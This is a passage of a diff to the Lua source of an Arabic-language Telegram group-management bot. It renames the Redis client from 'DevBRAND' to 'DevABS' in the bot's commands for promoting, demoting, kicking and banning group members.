+DevABS:sadd(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه مالك")  
 end
 --     Source BRAND     --
@@ -4978,7 +4978,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
 else
-DevBRAND:srem(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من المالكين")  
 end end end
 end,nil)
@@ -4998,7 +4998,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
 else
-DevBRAND:srem(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من المالكين")  
 end end end
 end,nil)
@@ -5016,7 +5016,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 if tonumber(user) == tonumber(admins[i].user_id_) then  
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
 else
-DevBRAND:srem(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:BRANDConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من المالكين")  
 end end end
 end,nil)
@@ -5026,7 +5026,7 @@ end end
 if BRANDConstructor(msg) then
 if text ==('رفع منشئ اساسي') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5036,7 +5036,7 @@ if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) th
 local username = text:match('^رفع منشئ اساسي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5045,14 +5045,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
 local user = text:match('رفع منشئ اساسي (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,user)
+DevABS:sadd(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه منشئ اساسي")  
 end
 --     Source BRAND     --
 --  Rem BasicConstructor  --
 if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5062,7 +5062,7 @@ if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg
 local username = text:match('^تنزيل منشئ اساسي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5071,7 +5071,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل منشئ اساسي (%d+)')
-DevBRAND:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:BasicConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله منشئ اساسي")  
 end end
 if text ==('رفع منشئ اساسي') and not BRANDConstructor(msg) then
@@ -5082,7 +5082,7 @@ end
 if BasicConstructor(msg) then
 if text ==('رفع منشئ') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5092,7 +5092,7 @@ if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع منشئ @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5101,14 +5101,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
 local user = text:match('رفع منشئ (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:Constructor:'..msg.chat_id_,user)
+DevABS:sadd(BRAND..'BRAND:Constructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
 end
 --     Source BRAND     --
 --    Rem  Constructor    --
 if text ==('تنزيل منشئ') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5118,7 +5118,7 @@ if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل منشئ @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5127,7 +5127,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل منشئ (%d+)')
-DevBRAND:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:Constructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
 end 
 end
@@ -5136,7 +5136,7 @@ end
 if Constructor(msg) then
 if text ==('رفع مدير') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
 end  
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5146,7 +5146,7 @@ if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مدير @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5155,14 +5155,14 @@ resolve_username(username,promreply)
 end 
 if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مدير (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_,user)
+DevABS:sadd(BRAND..'BRAND:Managers:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء")  
 end
 --     Source BRAND     --
 --       Rem Manager      --
 if text ==('تنزيل مدير') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5172,7 +5172,7 @@ if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل مدير @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5181,14 +5181,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مدير (%d+)')
-DevBRAND:srem(BRAND..'BRAND:Managers:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:Managers:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
 end 
 --     Source BRAND     --
 --       Set Cleaner      --
 if text ==('رفع منظف') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:sadd(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5198,7 +5198,7 @@ if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع منظف @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5207,14 +5207,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
 local user = text:match('رفع منظف (%d+)')
-DevBRAND:sadd(BRAND..'BRAND:Cleaner:'..msg.chat_id_,user)
+DevABS:sadd(BRAND..'BRAND:Cleaner:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
 end
 --     Source BRAND     --
 --       Rem Cleaner      --
 if text ==('تنزيل منظف') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5224,7 +5224,7 @@ if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل منظف @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5233,7 +5233,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل منظف (%d+)')
-DevBRAND:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:Cleaner:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
 end end
 --     Source BRAND     --
@@ -5241,11 +5241,11 @@ end end
 if Manager(msg) then
 if text ==('رفع ادمن') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-if not BasicConstructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevABS:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5254,12 +5254,12 @@ end end
 if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع ادمن @(.*)')
 function promreply(extra,result,success)
-if not BasicConstructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevABS:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5268,18 +5268,18 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
 local user = text:match('رفع ادمن (%d+)')
-if not BasicConstructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevABS:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_,user)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
 end
 --     Source BRAND     --
 --        Rem admin       --
 if text ==('تنزيل ادمن') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5289,7 +5289,7 @@ if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل ادمن @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5298,7 +5298,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل ادمن (%d+)')
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
 end end
 --     Source BRAND     --
@@ -5306,11 +5306,11 @@ end end
 if Admin(msg) then
 if text ==('رفع مميز') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-if not BasicConstructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevABS:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevBRAND:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5319,12 +5319,12 @@ end end
 if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مميز @(.*)')
 function promreply(extra,result,success)
-if not BasicConstructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevABS:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.id_)
+DevABS:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5333,18 +5333,18 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مميز (%d+)')
-if not BasicConstructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevABS:get(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_) then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevBRAND:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_,user)
+DevABS:sadd(BRAND..'BRAND:VipMem:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين")  
 end
 --     Source BRAND     --
 --       Rem Vipmem       --
 if text ==('تنزيل مميز') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5354,7 +5354,7 @@ if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل مميز @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.id_)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5363,7 +5363,7 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مميز (%d+)')
-DevBRAND:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_,user)
+DevABS:srem(BRAND..'BRAND:VipMem:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
 end end 
 --     Source BRAND     --
@@ -5488,33 +5488,33 @@ end end end
 --     Source BRAND     --
 if Constructor(msg) then
 if text == "تفعيل الحظر" and ChCheck(msg) or text == "تفعيل الطرد" and ChCheck(msg) then
-DevBRAND:del(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الطرد والحظر'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == "تعطيل الحظر" and ChCheck(msg) or text == "تعطيل الطرد" and ChCheck(msg) then
-DevBRAND:set(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_,"true")
+DevABS:set(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_,"true")
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الطرد والحظر'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == "تفعيل الكتم" and ChCheck(msg) or text == "تفعيل التقييد" and ChCheck(msg) then
-DevBRAND:del(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الكتم والتقيد'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == "تعطيل الكتم" and ChCheck(msg) or text == "تعطيل التقييد" and ChCheck(msg) then
-DevBRAND:set(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_,"true")
+DevABS:set(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_,"true")
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الكتم والتقيد'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 end
 end
 if BasicConstructor(msg) then
 if text == "تفعيل الرفع" and ChCheck(msg) or text == "تفعيل الترقيه" and ChCheck(msg) then
-DevBRAND:del(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_)
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
 end
 if text == "تعطيل الرفع" and ChCheck(msg) or text == "تعطيل الترقيه" and ChCheck(msg) then
-DevBRAND:set(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_,"true")
+DevABS:set(BRAND.."BRAND:Lock:ProSet"..msg.chat_id_,"true")
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
 end
 end
@@ -5523,7 +5523,7 @@ end
 if Admin(msg) then
 if text ==('طرد') and ChCheck(msg) then
 function KickReply(extra, result, success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5550,7 +5550,7 @@ end end
 if text and text:match('^طرد @(.*)') and ChCheck(msg) then
 local username = text:match('^طرد @(.*)')
 function KickUser(extra,result,success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5578,7 +5578,7 @@ resolve_username(username,KickUser)
 end
 if text and text:match('^طرد (%d+)') and ChCheck(msg) then
 local user = text:match('طرد (%d+)')
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5605,7 +5605,7 @@ end
 if Admin(msg) then
 if text ==('حضر') or text ==('حظر') and ChCheck(msg) then
 function BanReply(extra, result, success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5622,7 +5622,7 @@ send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المج�
 return false  
 end
 ChatKick(result.chat_id_, result.sender_user_id_)
-DevBRAND:sadd(BRAND..'BRAND:Ban:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Ban:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم حظره من المجموعه") 
 end,nil) 
 end 
@@ -5633,7 +5633,7 @@ end end
 if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) then
 local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
 function BanUser(extra,result,success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5651,7 +5651,7 @@ send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المج�
 return false  
 end
 ChatKick(msg.chat_id_, result.id_)
-DevBRAND:sadd(BRAND..'BRAND:Ban:'..msg.chat_id_, result.id_)
+DevABS:sadd(BRAND..'BRAND:Ban:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم حظره من المجموعه")  
 end,nil) 
 end
@@ -5662,7 +5662,7 @@ resolve_username(username,BanUser)
 end
 if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) then
 local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
